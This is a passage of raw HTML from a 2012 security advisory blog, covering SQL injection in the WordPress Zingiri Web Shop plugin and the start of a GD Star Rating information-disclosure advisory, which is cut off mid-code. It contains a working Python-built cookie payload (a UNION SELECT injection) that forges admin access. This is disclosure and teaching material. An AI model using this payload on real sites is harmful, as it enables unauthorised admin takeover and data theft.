data-line="crayon-53c9878a670fc224281238-247">247</div><div class="crayon-num" data-line="crayon-53c9878a670fc224281238-248">248</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a670fc224281238-249">249</div><div class="crayon-num" data-line="crayon-53c9878a670fc224281238-250">250</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a670fc224281238-251">251</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a670fc224281238-220"><span class="crayon-c">// is the id of an admin?</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a670fc224281238-221"><span class="crayon-t">Function</span><span class="crayon-h"> </span><span class="crayon-e">IsAdmin</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a670fc224281238-222"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">Global</span><span class="crayon-h"> </span><span class="crayon-v">$dbtablesprefix</span><span class="crayon-sy">,</span><span class="crayon-v">$integrator</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a670fc224281238-223">&nbsp;</div><div class="crayon-line" id="crayon-53c9878a670fc224281238-224"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$integrator</span><span class="crayon-o">-&gt;</span><span class="crayon-e">isAdmin</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-k ">return</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a670fc224281238-225"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">//joomla</span></div><div class="crayon-line" id="crayon-53c9878a670fc224281238-226"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">wsCurrentCmsUserIsShopAdmin</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-k ">return</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a670fc224281238-227">&nbsp;</div><div class="crayon-line" id="crayon-53c9878a670fc224281238-228"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">function_exists</span><span class="crayon-sy">(</span><span class="crayon-s">'wsLiveIsAdmin'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-e">wsLiveIsAdmin</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-k ">return</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a670fc224281238-229">&nbsp;</div><div class="crayon-line" id="crayon-53c9878a670fc224281238-230"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-k ">isset</span><span class="crayon-sy">(</span><span class="crayon-v">$_COOKIE</span><span class="crayon-sy">[</span><span class="crayon-s">'fws_cust'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-k ">return</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a670fc224281238-231"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$fws_cust</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">explode</span><span class="crayon-sy">(</span><span class="crayon-s">"#"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$_COOKIE</span><span class="crayon-sy">[</span><span class="crayon-s">'fws_cust'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a670fc224281238-232"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$customerid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$fws_cust</span><span class="crayon-sy">[</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a670fc224281238-233"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$md5pass</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$fws_cust</span><span class="crayon-sy">[</span><span class="crayon-cn">2</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a670fc224281238-234"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">is_null</span><span class="crayon-sy">(</span><span class="crayon-v">$customerid</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-k ">return</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a670fc224281238-235"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$f_query</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT * FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$dbtablesprefix</span><span class="crayon-sy">.</span><span class="crayon-s">"customer WHERE ID = "</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-v">$customerid</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a670fc224281238-236"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$f_sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">mysql_query</span><span class="crayon-sy">(</span><span class="crayon-v">$f_query</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a670fc224281238-237"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">while</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$f_row</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">mysql_fetch_row</span><span class="crayon-sy">(</span><span class="crayon-v">$f_sql</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a670fc224281238-238"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$f_row</span><span class="crayon-sy">[</span><span class="crayon-cn">13</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"ADMIN"</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-e">md5</span><span class="crayon-sy">(</span><span class="crayon-v">$f_row</span><span class="crayon-sy">[</span><span class="crayon-cn">2</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-v">$md5pass</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a670fc224281238-239"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a670fc224281238-240"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$f_row</span><span class="crayon-sy">[</span><span class="crayon-cn">6</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-e">GetUserIP</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a670fc224281238-241"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">return</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9878a670fc224281238-242"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a670fc224281238-243"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">return</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9878a670fc224281238-244"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a670fc224281238-245"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a670fc224281238-246"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">return</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a670fc224281238-247"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9878a670fc224281238-248"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a670fc224281238-249"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9878a670fc224281238-250"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">return</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a670fc224281238-251"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0122 seconds] -->
<p>It splits(Explode!!) the fws_cust cookie by the # character, extracts a md5&#8242;ed password and an userID, and then fetches the corresponding user in the database. Notice however on line 232 and 235 that it does not sanitize the input, leading to a SQL injection. We can abuse this to forge a cookie which gives us admin rights using this simple python script:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a6710c612854438" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">Python</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
def ToHexString(input):
        hexString = "0x"
        for s in input:
                hexString += hex(ord(s))[2:]
        return hexString

cookie = "fws_cust=X#99999 UNION SELECT 1, 2, 3, 4, 5, 6, %s, 8, 9, 10, 11, 12, 13, %s, 15, 16, 17, 18, 19 FROM wp_zing_customer#eccbc87e4b5ce2fe28308fd9f2a7baf3" % (ToHexString(raw_input("Enter attacker IP:")), ToHexString("ADMIN"))</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a6710c612854438-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6710c612854438-2">2</div><div class="crayon-num" data-line="crayon-53c9878a6710c612854438-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6710c612854438-4">4</div><div class="crayon-num" data-line="crayon-53c9878a6710c612854438-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6710c612854438-6">6</div><div class="crayon-num" data-line="crayon-53c9878a6710c612854438-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a6710c612854438-1"><span class="crayon-r">def</span><span class="crayon-h"> </span><span class="crayon-e">ToHexString</span><span class="crayon-sy">(</span><span class="crayon-k ">input</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6710c612854438-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">hexString</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"0x"</span></div><div class="crayon-line" id="crayon-53c9878a6710c612854438-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">s</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-k ">input</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6710c612854438-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">hexString</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-k ">hex</span><span class="crayon-sy">(</span><span class="crayon-k ">ord</span><span class="crayon-sy">(</span><span class="crayon-i">s</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">2</span><span class="crayon-o">:</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-53c9878a6710c612854438-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">hexString</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6710c612854438-6">&nbsp;</div><div class="crayon-line" id="crayon-53c9878a6710c612854438-7"><span class="crayon-k ">cookie</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"fws_cust=X#99999 UNION SELECT 1, 2, 3, 4, 5, 6, %s, 8, 9, 10, 11, 12, 13, %s, 15, 16, 17, 18, 19 FROM wp_zing_customer#eccbc87e4b5ce2fe28308fd9f2a7baf3"</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">ToHexString</span><span class="crayon-sy">(</span><span class="crayon-k ">raw_input</span><span class="crayon-sy">(</span><span class="crayon-s">"Enter attacker IP:"</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">ToHexString</span><span class="crayon-sy">(</span><span class="crayon-s">"ADMIN"</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0035 seconds] -->
<p>Numerous other vulnerabilities were fixed that used same attack vector, as a result of copy paste. These can be found by <a href="http://plugins.trac.wordpress.org/changeset?reponame=&amp;new=585862%40zingiri-web-shop&amp;old=538811%40zingiri-web-shop#file5">here</a> quite easily, and exploited the same way.</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>, <a href="http://ceriksen.com/tag/zingiri-web-shop/" rel="tag">Zingiri Web Shop</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2012/08/20/wordpress-zingiri-shop-sql-injection-vulnerabilities/#respond" title="Comment on WordPress Zingiri Shop SQL injection vulnerabilities">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-128 -->

				
					
<article id="post-39" class="post-39 post type-post status-publish format-standard hentry category-advisories tag-gd-star-rating tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2012/07/25/wordpress-gd-star-rating-information-disclosure-vulnerability/" title="9:58 pm" rel="bookmark" class="entry-date"><time datetime="2012-07-25T21:58:17+00:00" pubdate>July 25, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2012/07/25/wordpress-gd-star-rating-information-disclosure-vulnerability/" title="Permalink to WordPress GD Star Rating information disclosure vulnerability" rel="bookmark">WordPress GD Star Rating information disclosure vulnerability</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong><br />
<a href="http://secunia.com/advisories/49850/">Secunia Advisory SA 49850</a></p>
<p><strong>Analysis</strong><br />
The GD Star Rating plugin &#8220;allows you to set up advanced rating and review system for post types and comments in your blog using single, multi and thumbs ratings&#8221;. Through its admin interface, you can export some data, such as T2 templates and votes. The interesting thing it will allow you to do, is export user data. This will include userID, username, user email address, what vote was casted on which post, when the vote was cast, IP and user agent. However, a flaw exists in the code in <a href="http://plugins.svn.wordpress.org/gd-star-rating/trunk/export.php">export.php</a> which allows for information disclosure of these values.</p>
<p>The file will import some configuration and export classes, and then start figuring out what to export. It then takes the &#8220;ex&#8221; value to determine the export type, &#8220;de&#8221; for the data to export(Article or comment data), and then &#8220;us&#8221; for how much data to export.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a6782e821015689" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
require_once("./code/cls/export.php");
require_once("./config.php");
$wpload = get_gdsr_wpload_path();
require($wpload);

global $wpdb;

if (isset($_GET["ex"])) {
    $export_type = $_GET["ex"];
    $get_data = $_GET;

    switch($export_type) {
        case "user":
            $export_name = $export_type.'_'.$_GET["de"];
            break;
        case "t2":
            $export_name = 't2';
            break;
        case "t2full":
            $export_name = 't2_full';
            break;
    }

    switch($export_type) {
        case "user":
            $values = array("us" =&gt; array("min", "nor"), "de" =&gt; array("article", "comment"));

            foreach ($get_data as $key =&gt; $value) {
                if (isset($values[$key])) {
                    if (!in_array($value, $values[$key])) {
                        die("invalid_request");
                    }
                } else if ($key != "ex") {
                    if ($value !== "on") {
                        die("invalid_request");
                    }
                }
            }

            header('Content-type: text/csv');
            header('Content-Disposition: attachment; filename="gdsr_export_'.$export_name.'.csv"');
            $sql = GDSRExport::export_users($_GET["us"], $_GET["de"], $get_data);
            $rows = $wpdb-&gt;get_results($sql, ARRAY_N);
            if (count($rows) &gt; 0) {
                foreach ($rows as $row) {
                    echo '"'.join('", "', $row).'"';
                    echo "\r\n";
                }
            }
            break;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a6782e821015689-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6782e821015689-2">2</div><div class="crayon-num" data-line="crayon-53c9878a6782e821015689-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6782e821015689-4">4</div><div class="crayon-num" data-line="crayon-53c9878a6782e821015689-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6782e821015689-6">6</div><div class="crayon-num" data-line="crayon-53c9878a6782e821015689-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6782e821015689-8">8</div><div class="crayon-num" data-line="crayon-53c9878a6782e821015689-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6782e821015689-10">10</div><div class="crayon-num" data-line="crayon-53c9878a6782e821015689-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6782e821015689-12">12</div><div class="crayon-num" data-line="crayon-53c9878a6782e821015689-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6782e821015689-14">14</div><div class="crayon-num" data-line="crayon-53c9878a6782e821015689-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6782e821015689-16">16</div><div class="crayon-num" data-line="crayon-53c9878a6782e821015689-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6782e821015689-18">18</div><div class="crayon-num" data-line="crayon-53c9878a6782e821015689-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6782e821015689-20">20</div><div class="crayon-num" data-line="crayon-53c9878a6782e821015689-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6782e821015689-22">22</div><div class="crayon-num" data-line="crayon-53c9878a6782e821015689-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6782e821015689-24">24</div><div class="crayon-num" data-line="crayon-53c9878a6782e821015689-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6782e821015689-26">26</div><div class="crayon-num" data-line="crayon-53c9878a6782e821015689-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6782e821015689-28">28</div><div class="crayon-num" data-line="crayon-53c9878a6782e821015689-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6782e821015689-30">30</div><div class="crayon-num" data-line="crayon-53c9878a6782e821015689-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6782e821015689-32">32</div><div class="crayon-num" data-line="crayon-53c9878a6782e821015689-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6782e821015689-34">34</div><div class="crayon-num" data-line="crayon-53c9878a6782e821015689-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6782e821015689-36">36</div><div class="crayon-num" data-line="crayon-53c9878a6782e821015689-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6782e821015689-38">38</div><div class="crayon-num" data-line="crayon-53c9878a6782e821015689-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6782e821015689-40">40</div><div class="crayon-num" data-line="crayon-53c9878a6782e821015689-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6782e821015689-42">42</div><div class="crayon-num" data-line="crayon-53c9878a6782e821015689-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6782e821015689-44">44</div><div class="crayon-num" data-line="crayon-53c9878a6782e821015689-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6782e821015689-46">46</div><div class="crayon-num" data-line="crayon-53c9878a6782e821015689-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6782e821015689-48">48</div><div class="crayon-num" data-line="crayon-53c9878a6782e821015689-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6782e821015689-50">50</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a6782e821015689-1"><span class="crayon-e">require_once</span><span class="crayon-sy">(</span><span class="crayon-s">"./code/cls/export.php"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6782e821015689-2"><span class="crayon-e">require_once</span><span class="crayon-sy">(</span><span class="crayon-s">"./config.php"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6782e821015689-3"><span class="crayon-sy">$</span><span class="crayon-v">wpload</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">get_gdsr_wpload_path</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6782e821015689-4"><span class="crayon-e">require</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">wpload</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" 